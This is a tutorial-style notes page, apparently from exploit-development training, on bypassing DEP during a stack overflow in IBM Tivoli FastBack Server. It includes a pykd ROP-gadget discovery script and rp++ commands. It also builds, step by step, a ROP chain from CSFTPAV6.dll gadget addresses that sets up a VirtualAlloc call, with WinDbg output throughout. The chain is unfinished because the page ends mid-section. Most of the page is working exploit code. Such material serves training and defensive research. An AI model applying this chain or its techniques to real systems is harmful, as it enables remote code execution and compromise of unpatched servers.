# 9. Stack  Overflows and DEP Bypass

## Check current memory protections



```bash
# WinDbg - Display the memory protections of a given address
!vprot eip
!vprot esp
# Check mitigations with narly won't work for Windows Defender Exploit Guard
.load narly
!nmod
```

## Windows Defender Exploit Guard

### Enable DEP for a program

1. From start menu open Windows Defender Security Center
2. Select App & Browser control and scroll to the bottom and click on Exploit protection settings
3. Click on Program Settings tab
4. Click Add program to customize and select Choose exact file path
5. Select the desired EXE file
6. In the program settings menu scroll down to Data Execution Prevention and click on Override system settings to On.&#x20;

### Verify DEP is enabled without Narly

```bash
0:066> ed esp 90909090

0:066> r eip = esp

0:066> p
(7a8.1310): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00240000 ebx=00000000 ecx=77939bc0 edx=77939bc0 esi=77939bc0 edi=77939bc0
eip=0b93ff54 esp=0b93ff54 ebp=0b93ff80 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
0b93ff54 90              nop
```

## Gadget selection

### Debugger Automation: Pykd

Basic PoC code

```python
from pykd import *
dprintln("Hello World!")
```

```
.load pykd
!py C:\Tools\pykd\HelloWorld.py
```

<figure><img src="../../../../.gitbook/assets/image (179).png" alt=""><figcaption></figcaption></figure>

#### Locating executable pages

```python
"""
Pykd Gadget Discovery Tool
"""

from pykd import *
import sys, time

HEADER =  "#"*80 + "\r\n"
HEADER += "# findrop.py - pykd module for Gadget Discovery\r\n"
HEADER += "#"*80 + "\r\n\r\n"

##MEM_ACCESS = {
##0x1   : "PAGE_NOACCESS"                                                    ,
##0x2   : "PAGE_READONLY"                                                    ,
##0x4   : "PAGE_READWRITE"                                                   ,
##0x8   : "PAGE_WRITECOPY"                                                   ,
##0x10  : "PAGE_EXECUTE"                                                     ,
##0x20  : "PAGE_EXECUTE_READ"                                                ,
##0x40  : "PAGE_EXECUTE_READWRITE"                                           ,
##0x80  : "PAGE_EXECUTE_WRITECOPY"                                           ,
##0x101 : "PAGE_NOACCESS PAGE_GUARD"                                         ,
##0x102 : "PAGE_READONLY PAGE_GUARD "                                        ,
##0x104 : "PAGE_READWRITE PAGE_GUARD"                                        ,
##0x108 : "PAGE_WRITECOPY PAGE_GUARD"                                        ,
##0x110 : "PAGE_EXECUTE PAGE_GUARD"                                          ,
##0x120 : "PAGE_EXECUTE_READ PAGE_GUARD"                                     ,
##0x140 : "PAGE_EXECUTE_READWRITE PAGE_GUARD"                                ,
##0x180 : "PAGE_EXECUTE_WRITECOPY PAGE_GUARD"                                ,
##0x301 : "PAGE_NOACCESS PAGE_GUARD PAGE_NOCACHE"                            ,
##0x302 : "PAGE_READONLY PAGE_GUARD PAGE_NOCACHE"                            ,
##0x304 : "PAGE_READWRITE PAGE_GUARD PAGE_NOCACHE"                           ,
##0x308 : "PAGE_WRITECOPY PAGE_GUARD PAGE_NOCACHE"                           ,
##0x310 : "PAGE_EXECUTE PAGE_GUARD PAGE_NOCACHE"                             ,
##0x320 : "PAGE_EXECUTE_READ PAGE_GUARD PAGE_NOCACHE"                        ,
##0x340 : "PAGE_EXECUTE_READWRITE PAGE_GUARD PAGE_NOCACHE"                   ,
##0x380 : "PAGE_EXECUTE_WRITECOPY PAGE_GUARD PAGE_NOCACHE"                   ,
##0x701 : "PAGE_NOACCESS PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE"          ,
##0x702 : "PAGE_READONLY PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE"          ,
##0x704 : "PAGE_READWRITE PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE"         ,
##0x708 : "PAGE_WRITECOPY PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE"         ,
##0x710 : "PAGE_EXECUTE PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE"           ,
##0x720 : "PAGE_EXECUTE_READ PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE"      ,
##0x740 : "PAGE_EXECUTE_READWRITE PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE" ,
##0x780 : "PAGE_EXECUTE_WRITECOPY PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE" ,
##}

MEM_ACCESS_EXE = {
0x10  : "PAGE_EXECUTE"                                                     ,
0x20  : "PAGE_EXECUTE_READ"                                                ,
0x40  : "PAGE_EXECUTE_READWRITE"                                           ,
0x80  : "PAGE_EXECUTE_WRITECOPY"                                           ,
}

PAGE_SIZE = 0x1000
MAX_GADGET_SIZE = 8


BAD = ["clts", "hlt", "lmsw", "ltr", "lgdt", "lidt" ,"lldt", "mov cr", "mov dr",
    "mov tr", "in ", "ins", "invlpg", "invd", "out", "outs", "cli", "sti"
    "popf", "pushf", "int", "iret", "iretd", "swapgs", "wbinvd", "call",
    "jmp", "leave", "ja", "jb", "jc", "je", "jr", "jg", "jl", "jn", "jo",
    "jp", "js", "jz", "lock", "enter", "wait", "???"]

def log(msg):
 """
 Log a message to console.
 @param msg: Message string
 @return: None
 """
 print("[+] " + msg)

def getModule(modname):
 """
 Return a module object.
 @param modname: string module name
 @return: pykd module object
 """
 return module(modname)

def isPageExec(address):
 """
 Return True if a mem page is marked as executable
 @param address: address in hex format 0x41414141.
 @return: Bool
 """
 try:
     protect = getVaProtect(address)
 except:
     protect = 0x1
 if protect in MEM_ACCESS_EXE.keys():
     return True
 else:
     return False

def findExecPages(mod):
 """
 Find Executable Memory Pages for a module.
 @param mod: module object returned by getModule
 @return: a python list of executable memory pages
 """
 pages = []
 pn = int((mod.end() - mod.begin()) / PAGE_SIZE)
 log("Total Memory Pages: %d" % pn)
 for i in range(0, pn):
     page = mod.begin() + i*PAGE_SIZE
     if isPageExec(page):
         pages.append(page)
 log("Executable Memory Pages: %d" % len(pages))
 return pages

def findRetn(pages):
 """
 Find all return instructions for the given memory pages.
 @param pages: list of memory pages
 @return: list of memory addresses
 """
 retn = []
 for page in pages:
     ptr = page
     while ptr < (page + PAGE_SIZE):
         b = loadSignBytes(ptr, 1)[0] & 0xff
         if b not in [0xc3, 0xc2]:
             ptr += 1
             continue
         else:
             retn.append(ptr)
             ptr += 1
             
 log("Found %d ret instructions" % len(retn))
 return retn
 
def formatInstr(instr, mod):
 """
 Replace address with modbase+offset.
 @param instr: instruction string from disasm.instruction()
 @param mod: module object from getModule
 @return: formatted instruction string: modbase+offset instruction
 """
 address = int(instr[0:8], 0x10)
 offset = address - mod.begin()
 return "%s+0x%x\t%s" % (mod.name(), offset, instr[9:])

def disasmGadget(addr, mod, fp):
 """
 Find gadgets. Start from a ret instruction and crawl back from 1 to
 MAX_GADGET_SIZE bytes. At each iteration disassemble instructions and
 make sure the result gadget has no invalid instruction and is still
 ending with a ret.
 @param addr: address of a ret instruction
 @param mod: module object from getModule
 @param fp: file object to log found gadgets
 @return: number of gadgets found starting from a specific address
 """
 count = 0
 for i in range(1, MAX_GADGET_SIZE):
     gadget = []
     ptr = addr - i
     dasm = disasm(ptr)
     gadget_size = dasm.length()
     while gadget_size <= MAX_GADGET_SIZE:
         instr = dasm.instruction()
         if any(bad in instr for bad in BAD):
             break
         gadget.append(instr)
         if instr.find("ret") != -1:
             break
         dasm.disasm()
         gadget_size += dasm.length()
     matching = [i for i in gadget if "ret" in i]
     if matching:
         count += 1
         fp.write("-"*86 + "\r\n")
         for instr in gadget:
            try:
                fp.write(str(instr) + "\r\n")
            except UnicodeEncodeError:
                print(str(repr(instr)))
 return count
     
if __name__ == '__main__':
 print("#"*63)
 print("# findrop.py pykd Gadget Discovery module #")
 print("#"*63)
 
 count = 0
 try:
     modname = sys.argv[1].strip()
 except IndexError:
     log("Syntax: findrop.py modulename [MAX_GADGET_SIZE]")
     log("Example: findrop.py ntdll 8")
     sys.exit()

 try:
     MAX_GADGET_SIZE = int(sys.argv[2])
 except IndexError:
     pass
 except ValueError:
     log("Syntax: findrop.py modulename [MAX_GADGET_SIZE]")
     log("Example: findrop.py ntdll 8")
     log("MAX_GADGET_SIZE needs to be an integer")
     sys,exit()
     
 mod = getModule(modname)
 if mod:
     pages = findExecPages(mod)
     retn  = findRetn(pages)
     if retn:
         fp = open("C:/tools/pykd/findrop_output.txt", "w")
         fp.write(HEADER)
         start = time.time()
         log("Gadget discovery started...")
         for ret in retn:
             count += disasmGadget(ret, mod, fp)                        
         fp.close()
         end = time.time()
         log("Gadget discovery ended (%d secs)." % int(end-start))
         log("Found %d gadgets in %s." % (count, mod.name()))
     else:
         log("ret instructions not found!")
```

```bash
.load pykd
!py C:\Tools\pykd\findropfull FastBackServer
```

### Optimized Gadget Discovery: RP++

```bash
# Make a copy of the file to be searched
C:\Tools\dep> copy "C:\Program Files\Tivoli\TSM\FastBack\server\FastBackServer.exe" .
 1 file(s) copied.
# The -r 5 parameter specifies a maximum gadget length of 5
C:\Tools\dep> rp-win-x86.exe -f FastBackServer.exe -r 5 > rop.txt
# When searching use the below format to ensure nothing comes before the ret command
": pop eax ; ret"
```

## Bypassing DEP

### Getting The Offset

```bash
# Create pattern to find the offset
msf-pattern_create -l 0x200
# Run the updated PoC
python step1.py 192.168.223.10
# Find the offset
msf-pattern_offset -q 41326a41
```

### Confirm The Offset

```bash
# Update the PoC and rerun it. 
python step2.py 192.168.223.10
```

### Find the Bad Characters

{% code overflow="wrap" %}
```bash
# Update the PoC and rerun it. 
python step3.py 192.168.223.10
# Find the StackLimit & StackBase use them to search for the string to find the address location
!teb
s -b <StackLimit> <StackBase> 41 41 41 41 42 42 42 42
# Dump 150 bytes at the address found
db 0d1ee247 L150
# Bad Chars found
0x00, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20
```
{% endcode %}

### Locating Gadgets

{% code overflow="wrap" %}
```bash
# Check the base address of the executeable. 
lm m FastBackServer
Browse full module list
start    end        module name
00400000 00c0c000   FastBackServer   (deferred)
# Notice that the uppermost byte is 0x00 which is a bad character. This means this executable is not suitable and a DLL will have to be found to use. 
# Run the lm command to find a module with an address space that won't contain bad chars. 
lm 
start    end        module name
00190000 001c3000   snclientapi   (deferred)             
001d0000 001fd000   libcclog   (deferred)             
00400000 00c0c000   FastBackServer   (deferred)             
012e0000 01322000   NLS        (deferred)             
01340000 0136b000   gsk8iccs   (deferred)             
013a0000 013da000   icclib019   (deferred)             
03100000 031f0000   libeay32IBM019   (deferred)
# CSFTPAV6 will work
lm m CSFTPAV6
# Copy this module to the C:\Tools\dep folder. 
copy "C:\Program Files\Tivoli\TSM\FastBack\server\csftpav6.dll" .
# Generate a list of gadgets. 
rp-win-x86.exe -f csftpav6.dll -r 5 > rop.txt
```
{% endcode %}

### VirtualAlloc

**VirtualAlloc function prototype**

```
 LPVOID WINAPI VirtualAlloc(
   _In_opt_ LPVOID lpAddress,
   _In_     SIZE_T dwSize,
   _In_     DWORD  flAllocationType,
   _In_     DWORD  flProtect
 );
```

_**lpAddress** - P_oints to an address belonging to a previously committed memory page.

_**dwSize**_ - Size of the memory region whose protection properties we are trying to change. VirtualAlloc can only change the memory protections on a per-page basis, so as long as our shellcode is less than 0x1000 bytes, we can use any value between 0x01 and 0x1000.

_**flAllocationType**_ - Must be set to the _MEM\_COMMIT_ enum value (numerical value 0x00001000)

_**flProtect** - S_hould be set to the _PAGE\_EXECUTE\_READWRITE_ enum value (numerical value 0x00000040)

#### Example of the required values for invoking _VirtualAlloc_ with a fictitious stack address of 0x0d2be300 and a fictitious address for _VirtualAlloc_

```
0d2be300 75f5ab90 -> KERNEL32!VirtualAllocStub
0d2be304 0d2be488 -> Return address (Shellcode on the stack)
0d2be308 0d2be488 -> lpAddress (Shellcode on the stack)
0d2be30c 00000001 -> dwSize
0d2be310 00001000 -> flAllocationType
0d2be314 00000040 -> flProtect
```

**Note the name **_**VirtualAllocStub**_**, instead of **_**VirtualAlloc**_** listed above. The official API name is **_**VirtualAlloc**_**, but the symbol name for it, inside kernel32.dll, is **_**VirtualAllocStub**_**.**

A few things to note from the example above.

1. We do not know the _VirtualAlloc_ address beforehand.
2. We do not know the return address and the _lpAddress_ argument beforehand.
3. _dwSize_, _flAllocationType_, and _flProtect_ contain NULL bytes.

{% code overflow="wrap" %}
```bash
# Update PoC with dummy values and re-run
python step4.py 192.168.223.10
# The network packet will trigger the buffer overflow and position the dummy values exactly before the 0x42424242 DWORD that overwrites EIP
dd esp - 1C
0d07e300  45454545 46464646 00000000 48484848
0d07e310  00000000 51515151 42424242 43434343
# The location of the ROP skeleton is correct, but the DWORDs containing 0x47474747 and 0x49494949 were overwritten with null bytes as part of the process to trigger the vulnerability. This won't impact us since we're going to overwrite them again with ROP. In the next section, we will take the first step in replacing the dummy values with real values.
```
{% endcode %}

### Making ROP's Acquaintance

First thing get a copy of the ESP register

{% code overflow="wrap" %}
```bash
# Gadget that copies the content of ESP into ESI. The push eax, pop edi nullify each other so can pretty much be ignored. 
0x50501110: push esp ; push eax ; pop edi ; pop esi ; ret
```
{% endcode %}

Replace the EIP with this address

```python
offset = b"A" * (276 - len(va))
eip = pack("<L", (0x50501110)) # push esp ; push eax ; pop edi; pop esi ; ret
rop = b"C" * (0x400 - 276 - 4)
```

Procedure

{% code overflow="wrap" %}
```bash
# Re-run service / app and attach WinDbg. Before continuing operation of the application set a breakpoint. 
bp 0x50501110
g
# Update the PoC and re-run. 
python step5.py 192.168.223.10
# Single step through the application to make sure it does what you intend it to. 
p
dd esp L1
p
dd esp L2
p
dd esp L1
p
dd esp L1
```
{% endcode %}

### Obtaining VirtualAlloc Address

Open exe or library in IDA Pro and find VirtualAlloc on the Import tab.&#x20;

<figure><img src="../../../../.gitbook/assets/image (180).png" alt=""><figcaption></figcaption></figure>

Address will change at reboot however we can use the IAT entry along with a memory deference to fetch the address of VirtualAlloc at runtime. The dummy value 0x45454545, which represents the location of the _VirtualAlloc_ address, is at a negative offset of 0x1C from ESP. Ideally, since we have a copy of the ESP value in ESI, we would like to locate a gadget similar to the following.

```
SUB ESI, 0x1C
RETN
```

Sadly, we couldn't find this gadget or a similar one in CSFTPAV6. We'll need to be a bit more creative.

We could put the 0x1C value on the stack as part of our overflowing buffer and then pop that value into another register of our choice using a gadget. This would allow us to subtract the two registers and get the desired address.

The problem with this approach is that the 0x1C value is really 0x0000001C, which has NULL bytes in it.

We can get around the problem by adding -0x1C rather than subtracting 0x1C. The reason this works is because the CPU represents -0x1C as a very large value, as shown.

```
0:078> ? -0x1c
Evaluate expression: -28 = ffffffe4
```

We must put the negative value on the stack, pop it into a register, and then add it to the stack pointer address we stored in ESI.

To obtain a copy of ESI in EAX, we can use the gadget "MOV EAX,ESI ; POP ESI; RETN", which does a move operation. Additionally, we can update the _rop_ variable in the proof of concept as shown in Listing 46, so we can put it in action.

```
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
rop += pack("<L", (0x42424242)) # junk
rop += b"C" * (0x400 - 276 - 4 - len(rop))
```

Notice that the gadget contains a POP ESI instruction. This requires us to add a dummy DWORD on the stack for alignment.

{% code overflow="wrap" %}
```bash
# Re-run the application / service. Attach WinDbg and set the breakpoint to the previous address that was added for popping ESP into ESI. Then resume.
bp 0x50501110
g
# Update the PoC and re-run. 
python step6.py 192.168.223.10
# Once the PoC has been run. 
pt
p
p
p
dd esp L1
# This shows that the value has been correctly copied into eax. 
eax=0d52e31c ebx=05e4c9e8 ecx=0d52ca70 edx=77a61670 esi=42424242 edi=00000000
eip=50501191 esp=0d52e324 ebp=51515151 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
CSFTPAV6+0x1191:
50501191 c3              ret
0:062> dd esp L1
0d52e324  43434343

```
{% endcode %}

We can use a "POP ECX" instruction to get the negative value into ECX, followed by a gadget containing an "ADD EAX, ECX" instruction. This will allow us to add -0x1C to EAX as shown in Listing 48.

<pre class="language-python"><code class="lang-python">rop = pack("&#x3C;L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
rop += pack("&#x3C;L", (0x42424242)) # junk
<a data-footnote-ref href="#user-content-fn-1">rop += pack("&#x3C;L", (0x505115a3)) # pop ecx ; ret</a>
<a data-footnote-ref href="#user-content-fn-2">rop += pack("&#x3C;L", (0xffffffe4)) # -0x1C</a>
r<a data-footnote-ref href="#user-content-fn-3">op += pack("&#x3C;L", (0x5051579a)) # add eax, ecx ; ret</a>
rop += b"C" * (0x400 - 276 - 4 - len(rop))
</code></pre>

{% code overflow="wrap" %}
```bash
# Re-run the application / service. Then set a breakpoint on the pop ecx; ret command before resuming execution. 
bp 0x505115a3
g
# Update and run the PoC. 
python step7.py 192.168.223.10
# Run through the PoC to check it does what it should. 
p
p
p
dd eax L1
# eax appears to now have the correct value pointing to the dummy value for VirtualAlloc. 
eax=0d3ce300 ebx=05e9ab08 ecx=ffffffe4 edx=77a61670 esi=42424242 edi=00000000
eip=5051579c esp=0d3ce330 ebp=51515151 iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
CSFTPAV6!FtpUploadFileW+0x48fe:
5051579c c3              ret
0:062> dd eax L1
0d3ce300  45454545
```
{% endcode %}

With the correct value in EAX, we need to move that value back to ESI so we can use it in the next stages. We can do this with a gadget containing "PUSH EAX" and "POP ESI" instructions as shown.

<pre><code>rop = pack("&#x3C;L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
rop += pack("&#x3C;L", (0x42424242)) # junk
rop += pack("&#x3C;L", (0x505115a3)) # pop ecx ; ret
rop += pack("&#x3C;L", (0xffffffe4)) # -0x1C
rop += pack("&#x3C;L", (0x5051579a)) # add eax, ecx ; ret
<a data-footnote-ref href="#user-content-fn-4">rop += pack("&#x3C;L", (0x50537d5b)) # push eax ; pop esi ; ret</a>
rop += b"C" * (0x400 - 276 - 4 - len(rop))
</code></pre>



{% code overflow="wrap" %}
```bash
# Restart application / service and re-attach WinDbg. Be sure to set a breakpoint on the new command prior to resuming the execution. 
bp 0x50537d5b
g
# Run the updated PoC. 
python step8.py 192.168.223.10
# Step through the new call. 
p
p
dd esi L1
# ESI now has the correct address. 
Breakpoint 0 hit
eax=0d2ae300 ebx=05bbbbd0 ecx=ffffffe4 edx=77a61670 esi=42424242 edi=00000000
eip=50537d5b esp=0d2ae334 ebp=51515151 iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
CSFTPAV6!FtpUploadFileW+0x26ebd:
50537d5b 50              push    eax
0:006> p
eax=0d2ae300 ebx=05bbbbd0 ecx=ffffffe4 edx=77a61670 esi=42424242 edi=00000000
eip=50537d5c esp=0d2ae330 ebp=51515151 iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
CSFTPAV6!FtpUploadFileW+0x26ebe:
50537d5c 5e              pop     esi
0:006> p
eax=0d2ae300 ebx=05bbbbd0 ecx=ffffffe4 edx=77a61670 esi=0d2ae300 edi=00000000
eip=50537d5d esp=0d2ae334 ebp=51515151 iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
CSFTPAV6!FtpUploadFileW+0x26ebf:
50537d5d c3              ret
0:006> dd esi L1
0d2ae300  45454545
```
{% endcode %}

We previously found that the IAT address for _VirtualAlloc_ is 0x5054A220, but we know 0x20 is a bad character for our exploit. To solve this, we can increase its address by one and then use a couple of gadgets to decrease it to the original value. First, we use a POP EAX instruction to fetch the modified IAT address into EAX. Then we'll pop -0x00000001 (or its equivalent, 0xFFFFFFFF) into ECX through a POP ECX instruction. Next, we can reuse the ADD EAX, ECX instruction from the previous gadget to restore the IAT address value. Finally, we can use a dereference to move the address of _VirtualAlloc_ into EAX through a MOV EAX, DWORD \[EAX] instruction. We can see observe gadgets added to the updated ROP chain as shown.

<pre><code>rop = pack("&#x3C;L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
rop += pack("&#x3C;L", (0x42424242)) # junk
rop += pack("&#x3C;L", (0x505115a3)) # pop ecx ; ret
rop += pack("&#x3C;L", (0xffffffe4)) # -0x1C
rop += pack("&#x3C;L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("&#x3C;L", (0x50537d5b)) # push eax ; pop esi ; ret
<a data-footnote-ref href="#user-content-fn-5">rop += pack("&#x3C;L", (0x5053a0f5)) # pop eax ; ret</a>
<a data-footnote-ref href="#user-content-fn-6">rop += pack("&#x3C;L", (0x5054A221)) # VirtualAlloc IAT + 1</a>
<a data-footnote-ref href="#user-content-fn-7">rop += pack("&#x3C;L", (0x505115a3)) # pop ecx ; ret</a>
<a data-footnote-ref href="#user-content-fn-8">rop += pack("&#x3C;L", (0xffffffff)) # -1 into ecx</a>
<a data-footnote-ref href="#user-content-fn-9">rop += pack("&#x3C;L", (0x5051579a)) # add eax, ecx ; ret</a>
<a data-footnote-ref href="#user-content-fn-10">rop += pack("&#x3C;L", (0x5051f278)) # mov eax, dword [eax] ; ret</a>
rop += b"C" * (0x400 - 276 - 4 - len(rop))
</code></pre>

To reiterate, we pop the IAT address of _VirtualAlloc_ increased by one into EAX and pop 0xFFFFFFFF into ECX. Then we add them together to obtain the real _VirtualAlloc_ IAT address in EAX. Finally, we dereference that into EAX.

{% code overflow="wrap" %}
```bash
# Restart application / service and re-attach WinDbg. Be sure to set a breakpoint on the new command prior to resuming the execution. 
bp 0x5053a0f5
g
# Run the updated PoC. 
python step9.py 192.168.223.10
# Step through the new code. 
p
p
p
p
p
p
p
p
u eax L1
```
{% endcode %}

The actions set up by our ROP chain worked out and we have now dynamically obtained the address of _VirtualAlloc_ in EAX. The last step is to overwrite the placeholder value on the stack at the address we have stored in ESI. We can use an instruction like MOV DWORD \[ESI], EAX to write the address in EAX onto the address pointed to by ESI This is the place holder in the function to call VirtualAllow and the place we need to put the address. Our updated ROP chain in reflects this last step.

<pre><code>rop = pack("&#x3C;L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
rop += pack("&#x3C;L", (0x42424242)) # junk
rop += pack("&#x3C;L", (0x505115a3)) # pop ecx ; ret
rop += pack("&#x3C;L", (0xffffffe4)) # -0x1C
rop += pack("&#x3C;L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("&#x3C;L", (0x50537d5b)) # push eax ; pop esi ; ret
rop += pack("&#x3C;L", (0x5053a0f5)) # pop eax ; ret
rop += pack("&#x3C;L", (0x5054A221)) # VirtualAlloc IAT + 1
rop += pack("&#x3C;L", (0x505115a3)) # pop ecx ; ret
rop += pack("&#x3C;L", (0xffffffff)) # -1 into ecx
rop += pack("&#x3C;L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("&#x3C;L", (0x5051f278)) # mov eax, dword [eax] ; ret
<a data-footnote-ref href="#user-content-fn-11">rop += pack("&#x3C;L", (0x5051cbb6)) # mov dword [esi], eax ; ret</a>
rop += b"C" * (0x400 - 276 - 4 - len(rop))
</code></pre>

{% code overflow="wrap" %}
```bash
# Restart application / service and re-attach WinDbg. Be sure to set a breakpoint on the new command prior to resuming the execution. 
bp 0x5051cbb6
g
# Run the updated PoC. 
python step10.py 192.168.223.10
# Step through the new code. 
p
dds esi L1
```
{% endcode %}

### Patching the Return Address

To ensure that execution flow continues to our shellcode once the API finishes, we must manually place the shellcode address on the stack, right after the address of _VirtualAlloc_ to simulate a real call. This way, our shellcode address will be at the top of the stack when _VirtualAlloc_ finishes its job and executes a return instruction.

At the end of the last section, ESI contained the address on the stack where _VirtualAlloc_ was written. This means that ESI is only four bytes lower than the stack address we need. An instruction like ADD ESI, 0x4 would be ideal, but it does not exist in our selected module.

A common instruction we might find in a gadget is the incremental (INC) instruction. These instructions increase the value in a register by one.

In our case, we can find an INC ESI instruction in multiple gadgets. None of the gadgets are clean, but it's possible to find one without any bad side effects, as shown in.

<pre><code>rop = pack("&#x3C;L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
...
rop += pack("&#x3C;L", (0x5051cbb6)) # mov dword [esi], eax ; ret
<a data-footnote-ref href="#user-content-fn-12">rop += pack("&#x3C;L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret</a>
<a data-footnote-ref href="#user-content-fn-13">rop += pack("&#x3C;L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret</a>
<a data-footnote-ref href="#user-content-fn-14">rop += pack("&#x3C;L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret</a>
<a data-footnote-ref href="#user-content-fn-15">rop += pack("&#x3C;L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret</a>
rop += b"C" * (0x400 - 276 - 4 - len(rop))
</code></pre>

{% code overflow="wrap" %}
```bash
# Restart application / service and re-attach WinDbg. Be sure to set a breakpoint on the new command prior to resuming the execution. 
bp 0x50522fa7
g
# Run the updated PoC. 
python step11.py 192.168.223.10
# Step through the new code. 
dd esi L2
p
p
p
dds esi L1
```
{% endcode %}

With ESI aligned correctly, we need to get the shellcode address in EAX so that we can reuse the "MOV DWORD \[ESI], EAX ; RET" gadget to patch the placeholder value. The issue we face now is that we do not know the exact address of the shellcode since it will be placed after our ROP chain, which we haven't finished creating yet.

We will solve this problem by using the value in ESI and adding a fixed value to it. Once we finish building the ROP chain, we can update the fixed value to correctly align with the beginning of the shellcode.

First, we need to copy ESI into EAX. We need to do this in such a way that we keep the existing value in ESI, since we need it there to patch the placeholder value. An instruction like "MOV EAX, ESI" is optimal, but unfortunately, the only gadgets containing this instruction also pop a value into ESI. We can however solve this by restoring the value in ESI with the previously-used "PUSH EAX ; POP ESI ; RET" gadget.

Since we need to add a small positive offset to EAX, we have to deal with null bytes again. We can solve this once more by using a negative value.

Here we can simply use an arbitrary value, such as 0x210 bytes, represented as the negative value 0xfffffdf0. (The reason we use 0x210 instead of 0x200 is to avoid null bytes.)

We pop this negative value into ECX and use a gadget containing a SUB EAX, ECX instruction to set up EAX correctly. The required gadgets are given in Listing 58 as part of the updated ROP chain.

<pre><code>rop = pack("&#x3C;L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
...
rop += pack("&#x3C;L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += pack("&#x3C;L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("&#x3C;L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("&#x3C;L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("&#x3C;L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
<a data-footnote-ref href="#user-content-fn-16">rop += pack("&#x3C;L", (0x5050118e)) # mov eax, esi ; pop esi ; ret</a>
<a data-footnote-ref href="#user-content-fn-17">rop += pack("&#x3C;L", (0x42424242)) # junk</a>
<a data-footnote-ref href="#user-content-fn-18">rop += pack("&#x3C;L", (0x5052f773)) # push eax ; pop esi ; ret</a>
<a data-footnote-ref href="#user-content-fn-19">rop += pack("&#x3C;L", (0x505115a3)) # pop ecx ; ret</a>
<a data-footnote-ref href="#user-content-fn-20">rop += pack("&#x3C;L", (0xfffffdf0)) # -0x210</a>
<a data-footnote-ref href="#user-content-fn-21">rop += pack("&#x3C;L", (0x50533bf4)) # sub eax, ecx ; ret</a>
rop += b"C" * (0x400 - 276 - 4 - len(rop))
</code></pre>

{% code overflow="wrap" %}
```bash
# Restart application / service and re-attach WinDbg. Be sure to set a breakpoint on the new command prior to resuming the execution. 
bp 0x5050118e
g
# Run the updated PoC. 
python step12.py 192.168.223.10
# Step through the new code. 
g
p
...
p
dds esi L1
```
{% endcode %}

Once we know the exact offset from ESI to the shellcode, we can update the 0xfffffdf0 value to the correct one.

The last step of this section is to overwrite the fake shellcode address (0x46464646) value on the stack. Once again, we can do this using a gadget containing a "MOV DWORD \[ESI], EAX" instruction.

<pre><code>rop = pack("&#x3C;L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
...
rop += pack("&#x3C;L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += pack("&#x3C;L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("&#x3C;L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("&#x3C;L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("&#x3C;L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("&#x3C;L", (0x5050118e)) # mov eax, esi ; pop esi ; ret
rop += pack("&#x3C;L", (0x42424242)) # junk
rop += pack("&#x3C;L", (0x5052f773)) # push eax ; pop esi ; ret
rop += pack("&#x3C;L", (0x505115a3)) # pop ecx ; ret
rop += pack("&#x3C;L", (0xfffffdf0)) # -0x210
rop += pack("&#x3C;L", (0x50533bf4)) # sub eax, ecx ; ret
<a data-footnote-ref href="#user-content-fn-22">rop += pack("&#x3C;L", (0x5051cbb6)) # mov dword [esi], eax ; ret</a>
rop += b"C" * (0x400 - 276 - 4 - len(rop))
</code></pre>

{% code overflow="wrap" %}
```bash
# Restart application / service and re-attach WinDbg. Be sure to set a breakpoint on the new command prior to resuming the execution. 
bp 0x5051cbb6
g
# Run the updated PoC. 
python step13.py 192.168.223.10
# Step through the new code. 
g
p
dd poi(esi) L4
```
{% endcode %}

### Patching Arguments

To reiterate, _lpAddress_ should be the shellcode address, _dwSize_ should be 0x01, _flAllocationType_ should be 0x1000, and _flProtect_ should be 0x40.

In the previous example, we used the somewhat arbitrary value of -0x210 to align EAX to our shellcode. Since we increased ESI by 4, we need to use -0x20C or 0xfffffdf4 this time, as shown in the updated ROP chain below.

<pre><code>rop = pack("&#x3C;L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
...
rop += pack("&#x3C;L", (0x5051cbb6)) # mov dword [esi], eax ; ret
